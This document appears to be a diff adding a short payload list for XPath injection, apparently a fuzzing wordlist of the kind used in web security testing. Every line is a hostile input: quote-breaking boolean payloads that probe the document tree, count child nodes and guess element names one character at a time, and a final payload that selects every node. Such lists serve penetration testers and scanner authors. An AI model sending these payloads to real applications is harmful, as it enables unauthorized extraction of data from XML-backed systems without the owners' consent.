@@ -1,0 +1,12 @@
+` or count(parent::*[position()=1])=0 or `a`='b
+` or count(parent::*[position()=1])>0 or `a`='b
+1 or count(parent::*[position()=1])=0
+1 or count(parent::*[position()=1])>0
+neo' and count(../child::*)=6 or 'a'='b 
+neo' and string-length(name(parent::*))=6 or 'a'='b 
+neo' and substring(name(parent::*),1,1)='h' or 'a'='b 
+neo' and string-length(name(../child::*[position()=1]))=4 or 'a'='b 
+neo' and substring(name(../child::*[position()=1]), 1, 1)='h' or 'a'='b 
+neo' and string-length(name(/heroes/child::*))=4 or 'a'='b 
+neo' and string-length(name(//*))=6 or 'a'='b
+')] | //* | a[('&action=search
